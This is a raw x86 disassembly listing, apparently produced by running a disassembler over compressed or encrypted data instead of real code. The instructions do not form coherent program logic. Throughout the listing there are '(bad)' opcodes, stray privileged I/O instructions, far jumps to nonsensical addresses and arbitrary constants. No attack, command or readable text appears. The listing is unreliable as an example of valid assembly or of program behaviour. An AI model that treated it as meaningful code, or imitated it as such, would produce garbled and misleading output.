  421fc0:	sti    
  421fc1:	clc    
  421fc2:	or     bl,bl
  421fc4:	(bad)  
  421fc5:	pop    ss
  421fc6:	pop    ss
  421fc7:	idiv   DWORD PTR [edi-0x53f5fc2b]
  421fcd:	dec    esi
  421fce:	jp     0x421fdd
  421fd0:	mov    al,ds:0x1d6ed6cb
  421fd5:	inc    ebp
  421fd6:	xchg   edx,eax
  421fd7:	sbb    dl,bh
  421fd9:	dec    esi
  421fda:	(bad)  [esi-0x42]
  421fdd:	fstp   st(2)
  421fdf:	cs das 
  421fe1:	mov    DWORD PTR [edx],ebp
  421fe3:	bound  esi,QWORD PTR [eax+0x5de056ae]
  421fe9:	add    bh,cl
  421feb:	jle    0x421f77
  421fed:	or     ebx,ebx
  421fef:	push   esi
  421ff0:	adc    esi,esp
  421ff2:	add    dh,BYTE PTR [edi-0x529a5c2d]
  421ff8:	add    eax,0x1724aeda
  421ffd:	inc    ebx
  421ffe:	cwde   
  421fff:	stos   DWORD PTR es:[edi],eax
  422000:	imul   edi,DWORD PTR [edx],0xffffffed
  422003:	inc    edx
  422004:	add    esi,DWORD PTR [esi+0x27a0f299]
  42200a:	push   ss
  42200b:	out    dx,al
  42200c:	push   0xfffffff8
  42200e:	loope  0x422066
  422010:	mov    ebx,0x50712895
  422015:	pusha  
  422016:	add    ch,al
  422018:	scas   eax,DWORD PTR es:[edi]
  422019:	in     eax,0xe2
  42201b:	add    DWORD PTR [ebx],ecx
  42201d:	or     ebp,DWORD PTR [ebp-0x3b]
  422020:	xchg   BYTE PTR [ebp+eiz*2-0x6c],cl
  422024:	dec    edx
  422025:	lea    ebp,[ebp+0x63]
  422028:	mov    eax,ds:0x45fa1f57
  42202d:	mov    edx,0x8ec0d0e0
  422032:	test   al,0xd8
  422034:	stos   BYTE PTR es:[edi],al
  422035:	push   ss
  422036:	fcomip st,st(4)
  422038:	jb     0x422014
  42203a:	add    eax,0x1771b6b6
  42203f:	scas   al,BYTE PTR es:[edi]
  422040:	push   0x42
  422042:	jle    0x4220b6
  422044:	(bad)  
  422045:	jge    0x4220b1
  422047:	(bad)  [esi]
  422049:	push   ss
  42204a:	(bad)  
  42204b:	retf   0xe806
  42204e:	sahf   
  42204f:	loop   0x422010
  422051:	or     ch,bl
  422053:	sub    bl,al
  422055:	ss lahf 
  422057:	mov    eax,ds:0x8a640426
  42205c:	push   cs
  42205d:	add    BYTE PTR [edi],al
  42205f:	shl    BYTE PTR [esi-0x2c],0x9e
  422063:	pop    edi
  422064:	fnstcw WORD PTR [ecx]
  422066:	fcomp  DWORD PTR [eax+0x68]
  422069:	xchg   edi,eax
  42206a:	adc    BYTE PTR [edx+edi*8],dl
  42206d:	xlat   BYTE PTR ds:[ebx]
  42206e:	rcl    bh,1
  422070:	or     DWORD PTR [ebp-0x2574b913],esi
  422076:	jle    0x422007
  422078:	mul    BYTE PTR [eax+0x40]
  42207b:	jo     0x4220bb
  42207d:	jo     0x422034
  42207f:	sub    eax,0xd0983b6c
  422084:	enter  0xd992,0xe6
  422088:	(bad)  
  422089:	ret    0x2b42
  42208c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42208d:	sbb    al,0xe7
  42208f:	adc    eax,ebx
  422091:	jl     0x4220dd
  422093:	aad    0xd2
  422095:	ror    dh,cl
  422097:	and    ch,dl
  422099:	loopne 0x422039
  42209b:	stc    
  42209c:	(bad)  
  42209d:	sbb    ch,BYTE PTR [eax+0x37]
  4220a0:	sub    DWORD PTR [ebx-0x15e4e5f8],0x21a156b0
  4220aa:	inc    edi
  4220ab:	(bad)  [ecx-0x40927656]
  4220b1:	push   ds
  4220b2:	dec    edi
  4220b3:	push   es
  4220b4:	fdiv   DWORD PTR [esi+0x24bc355b]
  4220ba:	dec    ebp
  4220bb:	mov    ebp,0x2c250fd7
  4220c0:	push   ecx
  4220c1:	and    dh,BYTE PTR [esi-0x1fb1dc35]
  4220c7:	fbld   TBYTE PTR [eax+eax*2+0x1b6c2c2d]
  4220ce:	dec    esp
  4220cf:	mov    al,ds:0x642dc711
  4220d4:	bound  esp,QWORD PTR [ecx-0x5f]
  4220d7:	dec    ebx
  4220d8:	sbb    al,0x4b
  4220da:	xor    al,0x2f
  4220dc:	inc    ebx
  4220dd:	scas   al,BYTE PTR es:[edi]
  4220de:	sbb    bl,0xb6
  4220e1:	push   ebx
  4220e2:	mov    ds:0x6d6ebb02,al
  4220e7:	neg    DWORD PTR [ebp+0x0]
  4220ea:	jo     0x4220b1
  4220ec:	test   DWORD PTR [edx-0x2147b9ba],edi
  4220f2:	adc    al,0x2e
  4220f4:	pop    edi
  4220f5:	fdivr  DWORD PTR [esi+eiz*2]
  4220f8:	fs xor al,dh
  4220fb:	add    bl,ch
  4220fd:	sbb    DWORD PTR [esi+0x6a58dd73],eax
  422103:	inc    eax
  422104:	pop    edi
  422105:	jmp    0x2e530ebb
  42210a:	outs   dx,BYTE PTR ds:[esi]
  42210b:	ins    DWORD PTR es:[edi],dx
  42210c:	imul   ebp,DWORD PTR [eax+0x5c824783],0xffffffcc
  422113:	pop    ss
  422114:	sub    DWORD PTR [ecx-0x69],esi
  422117:	pop    ebx
  422118:	imul   ebx,DWORD PTR [eax-0xa898d80],0x26
  42211f:	pop    ds
  422120:	ins    DWORD PTR es:[edi],dx
  422121:	mov    bh,0xaf
  422123:	pop    ebx
  422124:	and    DWORD PTR fs:[edx+0x61],eax
  422128:	fld    QWORD PTR [esp+ecx*8-0x76]
  42212c:	jp     0x422172
  42212e:	mov    dh,BYTE PTR [esi+0x4132b6da]
  422134:	stos   BYTE PTR es:[edi],al
  422135:	add    eax,DWORD PTR [edi+0x55]
  422138:	sbb    BYTE PTR [esi+0x73],dh
  42213b:	mov    al,0x51
  42213d:	inc    esp
  42213e:	xchg   ebx,eax
  42213f:	rcl    bh,cl
  422141:	sub    DWORD PTR [ebx-0x52494fd8],0xffffffdd
  422148:	fidivr DWORD PTR ds:0x308a05d1
  42214e:	sub    DWORD PTR [ecx-0x4a5e52e8],ecx
  422154:	mov    esp,DWORD PTR [eax+0x21]
  422157:	pop    ebp
  422158:	dec    ecx
  422159:	push   0x15d05bb3
  42215e:	jo     0x422103
  422160:	jg     0x422143
  422162:	ficomp DWORD PTR [edi+edi*8]
  422165:	sub    DWORD PTR [esi],edx
  422167:	mov    al,0xf5
  422169:	push   esp
  42216a:	dec    edx
  42216b:	push   ebp
  42216c:	inc    esi
  42216d:	popf   
  42216e:	push   es
  42216f:	lods   eax,DWORD PTR ds:[esi]
  422170:	push   0xb46eb6dc
  422175:	das    
  422176:	(bad)  
  422177:	xchg   ecx,eax
  422178:	dec    esi
  422179:	lock mov cl,BYTE PTR [ebx]
  42217c:	test   DWORD PTR [ebp-0x235189c7],eax
  422182:	std    
  422183:	or     al,0x16
  422185:	(bad)  [esi+0x4c338655]
  42218b:	sub    al,0x74
  42218d:	outs   dx,DWORD PTR ds:[esi]
  42218e:	cmc    
  42218f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422190:	mov    al,0xb4
  422192:	mov    ch,0xa5
  422194:	shl    BYTE PTR [ecx+0x6c3b5966],0x7d
  42219b:	test   BYTE PTR [ebx],bl
  42219d:	in     eax,dx
  42219e:	(bad)  
  42219f:	mov    dh,0x88
  4221a1:	dec    ecx
  4221a2:	xor    cl,BYTE PTR [ecx]
  4221a4:	or     DWORD PTR [ebp+0x56caa92],eax
  4221aa:	test   DWORD PTR [esi-0x4d3493af],esi
  4221b0:	ja     0x422193
  4221b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221b3:	jbe    0x4221f7
  4221b5:	pop    es
  4221b6:	shr    BYTE PTR [ebp+0x1694064],0x90
  4221bd:	jae    0x422144
  4221bf:	mov    esp,0x943883b4
  4221c4:	jecxz  0x4221f9
  4221c6:	hlt    
  4221c7:	mov    ds:0x4a00e05f,al
  4221cc:	jbe    0x422177
  4221ce:	sub    DWORD PTR [eax+0x348a8473],edi
  4221d4:	retf   
  4221d5:	addr16 dec esi
  4221d7:	sbb    ecx,0x28
  4221da:	push   eax
  4221db:	mov    bh,0x7d
  4221dd:	pop    eax
  4221de:	retf   0x9090
  4221e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e2:	sub    BYTE PTR [ebp+0x3e07680b],0xd4
  4221e9:	adc    al,0x93
  4221eb:	pop    ebx
  4221ec:	mov    ebx,0xeb0085b5
  4221f1:	dec    ebp
  4221f2:	mov    ecx,0x2ce5140
  4221f7:	inc    ecx
  4221f8:	or     ebp,DWORD PTR [esp+esi*4+0x1b]
  4221fc:	ret    
  4221fd:	in     al,0xb9
  4221ff:	outs   dx,BYTE PTR ds:[esi]
  422200:	xor    al,dl
  422202:	test   al,0x1b
  422204:	shr    DWORD PTR [ebp+0x54c86e83],1
  42220a:	int3   
  42220b:	std    
  42220c:	ffreep st(5)
  42220e:	sub    BYTE PTR [esi],dl
  422210:	fsubr  DWORD PTR [eax+0x1d]
  422213:	xor    eax,0xbd527866
  422218:	pop    ss
  422219:	xor    ecx,ecx
  42221b:	mov    edi,0x7c5c6df0
  422220:	icebp  
  422221:	dec    esp
  422222:	stc    
  422223:	push   esi
  422224:	push   0x63b0943c
  422229:	add    dh,al
  42222b:	xor    al,0xb6
  42222d:	jbe    0x422298
  42222f:	sub    edx,edi
  422231:	scas   eax,DWORD PTR es:[edi]
  422232:	cmc    
  422233:	popa   
  422234:	stos   BYTE PTR es:[edi],al
  422235:	ja     0x42220b
  422237:	sbb    al,ch
  422239:	add    ch,BYTE PTR [eax+0x14]
  42223c:	std    
  42223d:	pop    ebx
  42223e:	jae    0x4221cf
  422240:	aaa    
  422241:	push   ss
  422242:	sbb    dl,BYTE PTR [edi+0x271b044c]
  422248:	fdiv   QWORD PTR [eax]
  42224a:	lahf   
  42224b:	mov    DWORD PTR [esi+esi*4-0x1b],edi
  42224f:	dec    ebx
  422250:	pop    ebx
  422251:	dec    esp
  422252:	repnz pop edi
  422254:	in     al,dx
  422255:	add    BYTE PTR [esi],ch
  422257:	cmp    eax,0x5ca1bfe0
  42225c:	sub    bh,BYTE PTR [edi+0x64488451]
  422262:	add    BYTE PTR [edi+eax*8+0x95ad6b],dh
  422269:	mov    eax,0x25f5135
  42226e:	push   eax
  42226f:	push   esi
  422270:	cmp    BYTE PTR [ebx-0x25],bl
  422273:	add    eax,0x8ae36ed
  422278:	(bad)  
  422279:	sub    al,0x87
  42227b:	lods   eax,DWORD PTR ds:[esi]
  42227c:	out    dx,eax
  42227d:	daa    
  42227e:	outs   dx,BYTE PTR ds:[esi]
  42227f:	ins    BYTE PTR es:[edi],dx
  422280:	sbb    ecx,DWORD PTR [ebx]
  422282:	adc    BYTE PTR [esi-0xc765cb8],ah
  422288:	xchg   esi,eax
  422289:	pop    edi
  42228a:	pop    eax
  42228b:	cmp    eax,0x9ed472dc
  422290:	adc    al,0x13
  422293:	dec    ebx
  422294:	push   0x3b
  422296:	inc    edx
  422297:	popa   
  422298:	popa   
  422299:	mov    ebx,0x4a54b30e
  42229e:	or     bl,cl
  4222a0:	and    BYTE PTR [ecx],dh
  4222a2:	jbe    0x42225b
  4222a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222a5:	loopne 0x42227d
  4222a7:	sub    edi,DWORD PTR [ebx-0x14ba9f34]
  4222ad:	sbb    bl,bl
  4222af:	push   0x551da08
  4222b4:	and    ebx,ebx
  4222b6:	xchg   ebp,eax
  4222b7:	and    DWORD PTR [edx-0x2e33124c],0x2ccf4a0b
  4222c1:	scas   eax,DWORD PTR es:[edi]
  4222c2:	popa   
  4222c3:	jmp    0xc1b1698a
  4222c8:	or     eax,0x7620d7f5
  4222cd:	mov    al,ds:0x6d4b0b0b
  4222d2:	hlt    
  4222d3:	enter  0xec38,0x1
  4222d7:	xor    bh,0x9d
  4222da:	push   edi
  4222db:	mov    bh,0xd6
  4222dd:	or     ch,BYTE PTR [esi+edx*4-0x5379f144]
  4222e4:	add    eax,0xd6edb42e
  4222e9:	leave  
  4222ea:	fld    st(3)
  4222ec:	mov    dh,0xb
  4222ee:	mov    ecx,0xc9066759
  4222f3:	outs   dx,BYTE PTR ds:[esi]
  4222f4:	in     eax,dx
  4222f5:	inc    esi
  4222f6:	fld    TBYTE PTR [esi-0x66]
  4222f9:	ret    0x82a
  4222fc:	xor    BYTE PTR [edi],dl
  4222fe:	(bad)  
  4222ff:	hlt    
  422300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422301:	or     BYTE PTR [eax-0x95b24c0],bh
  422307:	push   cs
  422308:	repz push edi
  42230a:	push   cs
  42230b:	aad    0x6d
  42230d:	popa   
  42230e:	imul   edi,DWORD PTR [ebx+0x54],0x74
  422312:	sbb    eax,0xa8d764e2
  422317:	aad    0x6e
  422319:	sbb    ebx,DWORD PTR [ebx]
  42231b:	or     eax,0xa39788c
  422320:	inc    edx
  422321:	dec    esp
  422322:	pop    DWORD PTR [esi+eax*1+0x53]
  422326:	jne    0x4222c9
  422328:	sub    DWORD PTR [edi+0x158ec7b6],ebp
  42232e:	iret   
  42232f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422331:	sub    BYTE PTR [ebp-0x59],0x39
  422335:	jecxz  0x422399
  422337:	sbb    dl,bl
  422339:	pop    ecx
  42233a:	fcom   DWORD PTR [esi]
  42233c:	mov    edx,0x15c82e82
  422341:	ffreep st(0)
  422343:	ret    0xd89e
  422346:	adc    DWORD PTR [edx+ebx*2+0x7],ebx
  42234a:	retf   
  42234b:	pop    ecx
  42234c:	imul   edi,edx,0x1b814a13
  422352:	pop    ebx
  422353:	ins    BYTE PTR es:[edi],dx
  422354:	rcr    BYTE PTR [edx+0x50],1
  422357:	fcomp  DWORD PTR [edi+edi*8-0x72492f91]
  42235e:	mov    cs,WORD PTR [edx+0xa78cd9]
  422364:	mov    bh,0x92
  422366:	adc    ebx,edx
  422368:	mov    dh,0x2d
  42236a:	fisub  DWORD PTR [ebp-0x1]
  42236d:	cmc    
  42236e:	(bad)  
  42236f:	fisub  DWORD PTR [ecx-0x4949f347]
  422375:	lods   eax,DWORD PTR ds:[esi]
  422376:	stos   DWORD PTR es:[edi],eax
  422377:	mov    edi,0x7dd3bcd1
  42237c:	xor    ch,BYTE PTR [edi+0x85b6830]
  422382:	fidivr DWORD PTR [ebx]
  422384:	mov    cl,0x2e
  422386:	mov    dh,BYTE PTR [ebx+0x6caddabe]
  42238c:	lods   eax,DWORD PTR ds:[esi]
  42238d:	fsub   QWORD PTR [eax]
  42238f:	add    al,0x44
  422391:	xor    cl,BYTE PTR ds:0x8850bbfe
  422397:	push   ss
  422398:	sub    BYTE PTR [ebx+eiz*4+0x4f],0x91
  42239d:	pop    ds
  42239e:	cwde   
  42239f:	fisubr DWORD PTR [ebp-0x14849f7d]
  4223a5:	push   eax
  4223a6:	push   cs
  4223a7:	fucomi st,st(1)
  4223a9:	push   eax
  4223aa:	fcmovu st,st(0)
  4223ac:	push   0xffffffdd
  4223ae:	retf   
  4223af:	and    BYTE PTR [ebx+0x6fce5804],al
  4223b5:	and    dh,BYTE PTR [ecx-0x3de5ca4b]
  4223bb:	(bad)  [eax]
  4223bd:	mov    dh,0xab
  4223bf:	scas   eax,DWORD PTR es:[edi]
  4223c0:	push   ebp
  4223c1:	fdiv   DWORD PTR [esi]
  4223c3:	fcomp  DWORD PTR [edx]
  4223c5:	into   
  4223c6:	ror    DWORD PTR [esi+0x7a],1
  4223c9:	jg     0x42236c
  4223cb:	fs push eax
  4223cd:	lds    esi,FWORD PTR [esi-0x39ad7223]
  4223d3:	ds jle 0x4223bf
  4223d6:	jp     0x422358
  4223d8:	pop    ebx
  4223d9:	(bad)  [esi-0x5c]
  4223dc:	pop    ds
  4223dd:	jae    0x422432
  4223df:	enter  0xe059,0x19
  4223e3:	call   0x5c39:0xec107694
  4223ea:	dec    edi
  4223eb:	jbe    0x4223c1
  4223ed:	dec    eax
  4223ee:	pop    ecx
  4223ef:	lods   eax,DWORD PTR ds:[esi]
  4223f0:	inc    esi
  4223f1:	mov    al,0x2d
  4223f3:	(bad)  
  4223f4:	mov    esi,0x465e74b6
  4223f9:	fild   DWORD PTR [edx+0x43]
  4223fc:	shl    eax,0x29
  4223ff:	popa   
  422400:	and    eax,0xff7a7c19
  422405:	inc    edx
  422406:	mov    ebx,0xf391b6d
  42240b:	fisub  DWORD PTR [ebx-0x74]
  42240e:	in     eax,0x51
  422410:	or     BYTE PTR [ebp-0x12e491af],al
  422416:	mov    BYTE PTR [edx+0x35],ch
  422419:	lahf   
  42241a:	lods   eax,DWORD PTR ds:[esi]
  42241b:	pop    ecx
  42241c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42241d:	xchg   edx,eax
  42241e:	mov    al,0x1
  422420:	loop   0x4223d8
  422422:	jle    0x422464
  422424:	cmp    bh,ch
  422426:	push   cs
  422427:	arpl   WORD PTR [ebp+edx*2+0x6e],di
  42242b:	sbb    ebx,DWORD PTR [ebx+0x17]
  42242e:	mov    ds:0x904ec230,al
  422433:	inc    esi
  422434:	push   eax
  422435:	dec    eax
  422436:	call   0x3470fafb
  42243b:	mov    ds:0x3503dc3a,al
  422440:	clc    
  422441:	cs loope 0x42241a
  422444:	push   edx
  422445:	mov    ebx,0x6274319f
  42244a:	sub    DWORD PTR [edi-0x75],ebx
  42244d:	sub    eax,0x9adb6459
  422452:	mov    al,ds:0xfeca15b
  422457:	and    al,0xad
  422459:	pop    ecx
  42245a:	jge    0x4224a0
  42245c:	add    esi,DWORD PTR [edi+0x37726b76]
  422462:	push   esp
  422463:	adc    eax,0xb179c847
  422468:	in     eax,dx
  422469:	adc    ebx,esp
  42246b:	push   0x8af91fc5
  422470:	mov    esp,0xedb629f6
  422475:	inc    edx
  422476:	popa   
  422477:	jo     0x42244a
  422479:	mov    ch,0x25
  42247b:	ins    DWORD PTR es:[edi],dx
  42247c:	mov    bl,0x3e
  42247e:	aam    0x2
  422480:	shr    BYTE PTR [ecx+0x63],cl
  422483:	mov    eax,ds:0x1a0f1ab
  422488:	xchg   ebx,eax
  422489:	jne    0x422441
  42248b:	imul   esi,DWORD PTR [esi+ebp*1-0x14c924a],0x2d
  422493:	add    eax,0x1120d231
  422498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422499:	test   DWORD PTR [ebp+0x7a09812],eax
  42249f:	retf   0x50b9
  4224a2:	cmp    ch,al
  4224a4:	inc    edx
  4224a5:	stc    
  4224a6:	jecxz  0x422466
  4224a8:	add    BYTE PTR [edi],bl
  4224aa:	mov    ds:0xf7b18a4f,al
  4224af:	mov    ds:0xdb75add5,eax
  4224b4:	sahf   
  4224b5:	mov    bh,0x5f
  4224b7:	sbb    BYTE PTR ds:0x69f774d6,dh
  4224bd:	xchg   edi,eax
  4224be:	cmp    cl,BYTE PTR [edx+0x5321b4d]
  4224c4:	mov    DWORD PTR [edx+0xa372b44],ebp
  4224ca:	(bad)  [esi+0x6b]
  4224cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224ce:	xchg   edx,eax
  4224cf:	fbstp  TBYTE PTR [edx-0x1bbb456b]
  4224d5:	test   DWORD PTR [ebp+0x0],ecx
  4224d8:	aaa    
  4224d9:	fsub   DWORD PTR [ebx]
  4224db:	outs   dx,BYTE PTR ds:[esi]
  4224dc:	mov    DWORD PTR [esi],esi
  4224de:	mov    esi,0x6c0c58aa
  4224e3:	sub    al,0x6c
  4224e5:	clc    
  4224e6:	mov    cl,0x61
  4224e8:	test   DWORD PTR [esi-0x3f],esp
  4224eb:	inc    edx
  4224ec:	mov    ch,ah
  4224ee:	inc    esi
  4224ef:	sub    ebp,edi
  4224f1:	scas   al,BYTE PTR es:[edi]
  4224f2:	push   ebp
  4224f3:	xchg   BYTE PTR [ebx],bh
  4224f5:	stos   DWORD PTR es:[edi],eax
  4224f6:	xor    dl,BYTE PTR ds:0x118e81b
  4224fc:	push   edx
  4224fd:	imul   ebx,DWORD PTR [ebx+0x47],0xffffffc5
  422501:	jbe    0x422499
  422503:	jne    0x42256d
  422505:	(bad)  
  422506:	jmp    0xc685bb04
  42250b:	lea    ebp,[esi]
  42250d:	mov    al,ds:0x51f3593e
  422512:	push   esi
  422513:	pop    edi
  422514:	mov    ah,0x2d
  422516:	pop    ebx
  422517:	add    esi,DWORD PTR [esi-0x115a089]
  42251d:	sti    
  42251e:	add    al,0xb1
  422520:	jl     0x4224dd
  422522:	mov    al,0xa4
  422524:	cmp    eax,0x74dd7c4c
  422529:	push   ss
  42252a:	add    BYTE PTR [edx],ch
  42252c:	int3   
  42252d:	jo     0x4224e5
  42252f:	test   DWORD PTR [ebp-0x1c6cc4a],eax
  422535:	test   eax,0x389ea6a4
  42253a:	mov    al,0xad
  42253c:	or     eax,0x888d3616
  422541:	pop    eax
  422542:	rcr    BYTE PTR [ecx-0x10],cl
  422545:	jg     0x422571
  422547:	ins    DWORD PTR es:[edi],dx
  422548:	fild   DWORD PTR [ebp-0xc64c2c7]
  42254e:	je     0x422567
  422550:	ret    0x8961
  422553:	sub    BYTE PTR [ebp-0x6af823d3],0x90
  42255a:	(bad)  
  42255b:	out    dx,eax
  42255c:	and    esi,DWORD PTR [edx]
  42255e:	pop    ds
  42255f:	test   al,0xf
  422561:	cs xor eax,0x75dc77af
  422567:	out    dx,eax
  422568:	inc    edi
  422569:	pop    ebx
  42256a:	push   0x29f6b62a
  42256f:	lods   al,BYTE PTR ds:[esi]
  422570:	aaa    
  422571:	mov    BYTE PTR [ebx],al
  422573:	dec    edx
  422574:	shl    DWORD PTR [ebp+0x46c170b2],1
  42257a:	mov    al,ds:0xc560a724
  42257f:	mov    ds:0x99035b6e,eax
  422584:	adc    al,0xad
  422586:	mov    eax,0x519b1fe0
  42258b:	or     BYTE PTR [edi+0x280b935b],0xa1
  422592:	lahf   
  422593:	jbe    0x422528
  422595:	mov    ds:0x16d0b803,eax
  42259a:	ror    BYTE PTR [edx-0x2913b91a],cl
  4225a0:	xchg   BYTE PTR [edi-0x3b],dl
  4225a3:	lea    esi,[esi+0x4b80b488]
  4225a9:	xor    ebp,DWORD PTR [ecx+0x21]
  4225ac:	mov    al,0x50
  4225ae:	sbb    ebx,DWORD PTR [ebx+0x5a]
  4225b1:	in     al,dx
  4225b2:	add    ch,BYTE PTR [eax+ebp*4-0xf]
  4225b6:	jmp    0x2b85:0xa17011d6
  4225bd:	jnp    0x4225eb
  4225bf:	xor    eax,0xb40fe43
  4225c4:	or     ebx,ebx
  4225c6:	jp     0x422557
  4225c8:	sub    BYTE PTR [ebp+0xc],0x82
  4225cc:	inc    eax
  4225cd:	pop    eax
  4225ce:	push   0xda401adb
  4225d3:	mov    ebp,0x12d4c438
  4225d8:	xor    eax,0x17376c44
  4225dd:	lods   al,BYTE PTR ds:[esi]
  4225de:	retf   
  4225df:	inc    BYTE PTR [ebp-0x3e89758c]
  4225e5:	push   eax
  4225e6:	mov    ebx,0xf20a88ad
  4225eb:	inc    edi
  4225ec:	sbb    al,0x77
  4225ee:	sbb    eax,0xb6da25e6
  4225f3:	fisubr DWORD PTR [esi]
  4225f5:	mov    eax,ds:0xfa83e413
  4225fa:	shr    BYTE PTR [eax+0x5b],0xb1
  4225fe:	mov    ch,0x58
  422600:	or     esp,DWORD PTR [edx+0x14]
  422603:	cmp    al,0xa2
  422605:	mov    eax,ds:0x61b0b06f
  42260a:	jbe    0x422590
  42260c:	mov    dl,0x4
  42260e:	ret    
  42260f:	ret    0x9cac
  422612:	add    BYTE PTR ds:0x796dada,ah
  422618:	xchg   edx,eax
  422619:	sub    DWORD PTR [edx+0x28d54422],ebx
  42261f:	outs   dx,BYTE PTR ds:[esi]
  422620:	sbb    eax,DWORD PTR [ebp-0x3706da1a]
  422626:	add    eax,0xa54bbf7a
  42262b:	test   al,0xed
  42262d:	or     BYTE PTR [esi+0x2],cl
  422630:	adc    al,0x3e
  422632:	fwait
  422633:	or     eax,0x6db47362
  422638:	out    dx,eax
  422639:	inc    edx
  42263a:	add    DWORD PTR [ebp-0xc],0x11
  42263e:	cld    
  42263f:	popa   
  422640:	popa   
  422641:	mov    eax,ds:0xa4cff0dd
  422646:	mov    edi,0x634057fa
  42264b:	dec    edi
  42264c:	ins    DWORD PTR es:[edi],dx
  42264d:	pop    ebp
  42264e:	aam    0x6d
  422650:	sbb    DWORD PTR [eax],esp
  422652:	ss ds stos DWORD PTR es:[edi],eax
  422655:	lock jge 0x42266e
  422658:	outs   dx,BYTE PTR ds:[esi]
  422659:	cmp    DWORD PTR [esi],esi
  42265b:	pop    esp
  42265c:	out    0x3c,al
  42265e:	rcl    BYTE PTR [edx],0x7
  422661:	pop    ecx
  422662:	xor    al,0x8d
  422664:	or     eax,0x9d6edb53
  422669:	jmp    0x977807f
  42266e:	sbb    esi,DWORD PTR [ebp-0x2f]
  422671:	lods   eax,DWORD PTR ds:[esi]
  422672:	jl     0x42262f
  422674:	fcos   
  422676:	es loope 0x422604
  422679:	or     DWORD PTR [ecx+0x7a6db5b1],esi
  42267f:	pop    edx
  422680:	adc    DWORD PTR [edi+0x6033be9d],edx
  422686:	outs   dx,BYTE PTR ds:[esi]
  422687:	sbb    ebx,ebx
  422689:	mov    dh,0xfc
  42268b:	mov    es,WORD PTR [ebx-0x1861e8e0]
  422691:	cmp    DWORD PTR [esi+0x29451fe7],eax
  422697:	mov    edx,0x3dc19a00
  42269c:	fild   DWORD PTR [edx-0x75]
  42269f:	or     bh,BYTE PTR [eax-0x4d]
  4226a2:	dec    esp
  4226a3:	lahf   
  4226a4:	push   ebx
  4226a5:	imul   ebx,DWORD PTR [ebx],0xac83f6df
  4226ab:	sahf   
  4226ac:	sub    eax,0x322605bc
  4226b1:	stc    
  4226b2:	jle    0x4226b2
  4226b4:	ins    DWORD PTR es:[edi],dx
  4226b5:	ins    BYTE PTR es:[edi],dx
  4226b6:	mov    ah,0xb
  4226b8:	mov    fs,WORD PTR [ebp+0x2418a15c]
  4226be:	ss nop
  4226c0:	(bad)  [esi+0x173eb016]
  4226c6:	fcmovnbe st,st(1)
  4226c8:	call   FWORD PTR [edx]
  4226ca:	pop    ecx
  4226cb:	push   ebx
  4226cc:	fidiv  DWORD PTR [esi-0x5b5f927b]
  4226d2:	ror    DWORD PTR [esi+0x7acda778],cl
  4226d8:	mov    bh,0x61
  4226da:	popa   
  4226db:	mov    eax,ds:0x2cb50e5d
  4226e0:	clc    
  4226e1:	jmp    0x422690
  4226e3:	(bad)  
  4226e4:	dec    edx
  4226e5:	mov    dl,dl
  4226e7:	inc    edx
  4226e8:	add    esi,DWORD PTR [ebp-0x28]
  4226eb:	lods   eax,DWORD PTR ds:[esi]
  4226ec:	loope  0x42272c
  4226ee:	push   edx
  4226ef:	push   ecx
  4226f0:	jp     0x42275d
  4226f2:	inc    eax
  4226f3:	pop    ebx
  4226f4:	in     eax,dx
  4226f5:	jge    0x422760
  4226f7:	ds xchg edi,eax
  4226f9:	repz jbe 0x422737
  4226fc:	rol    DWORD PTR ds:0x104a6171,1
  422702:	bound  edi,QWORD PTR [edx-0x4924abc4]
  422708:	mov    al,0xb4
  42270a:	call   FWORD PTR [ebp-0x71]
  42270d:	in     al,0xfa
  42270f:	outs   dx,DWORD PTR ds:[esi]
  422710:	mov    bl,0x9e
  422712:	vpsubq xmm6,xmm0,XMMWORD PTR [ecx+0x64e06d04]
  42271a:	fstp   TBYTE PTR [eax-0x13d26e0a]
  422720:	outs   dx,BYTE PTR ds:[esi]
  422721:	or     ecx,DWORD PTR [ebx]
  422723:	ins    DWORD PTR es:[edi],dx
  422724:	pop    ss
  422725:	ret    0xab31
  422728:	call   0x9864db8
  42272d:	mov    dh,0x50
  42272f:	fcmovnbe st,st(6)
  422731:	retf   
  422732:	xor    eax,0x9df5415c
  422737:	and    bl,ch
  422739:	mov    dh,0xad
  42273b:	test   DWORD PTR [ebp-0x652ce49c],eax
  422741:	push   edx
  422742:	test   DWORD PTR [ebp+0x7f],edi
  422745:	ins    BYTE PTR es:[edi],dx
  422746:	or     eax,0x9942a580
  42274b:	sbb    ecx,eax
  42274d:	xchg   ebp,eax
  42274e:	ins    DWORD PTR es:[edi],dx
  42274f:	ins    BYTE PTR es:[edi],dx
  422750:	sub    eax,0x1ed0f6c
  422755:	pop    ebx
  422756:	push   0x31
  422758:	in     eax,dx
  422759:	lods   al,BYTE PTR ds:[esi]
  42275a:	outs   dx,BYTE PTR ds:[esi]
  42275b:	in     eax,dx
  42275c:	mov    dh,0xb5
  42275e:	cmc    
  42275f:	xlat   BYTE PTR ds:[ebx]
  422760:	and    BYTE PTR [edx-0x495d3f5],0x20
  422767:	mov    ebp,DWORD PTR [eax+0x21add28]
  42276d:	in     al,0xaf
  42276f:	(bad)  
  422770:	jecxz  0x4227b3
  422772:	fwait
  422773:	xor    edx,eax
  422775:	push   ebp
  422776:	pop    esp
  422777:	in     eax,0xa3
  422779:	mov    edx,0x29308a93
  42277e:	push   es
  42277f:	bound  eax,QWORD PTR [ecx]
  422781:	push   0xbba3fe17
  422786:	pop    edx
  422787:	imul   esp,DWORD PTR [esi+0x991abad],0xffffffbf
  42278e:	mov    bh,BYTE PTR es:[esi]
  422791:	test   DWORD PTR ds:0x3086d816,eax
  422797:	mov    ebp,0x7c828d23
  42279c:	fcomp  DWORD PTR [edx+0x68]
  42279f:	fld    TBYTE PTR [eax+0x5ceb1444]
  4227a5:	or     bl,dh
  4227a7:	and    ah,BYTE PTR [ecx]
  4227a9:	fld    TBYTE PTR [ebp-0x883a5a3]
  4227af:	add    dh,BYTE PTR [edx+ebx*4]
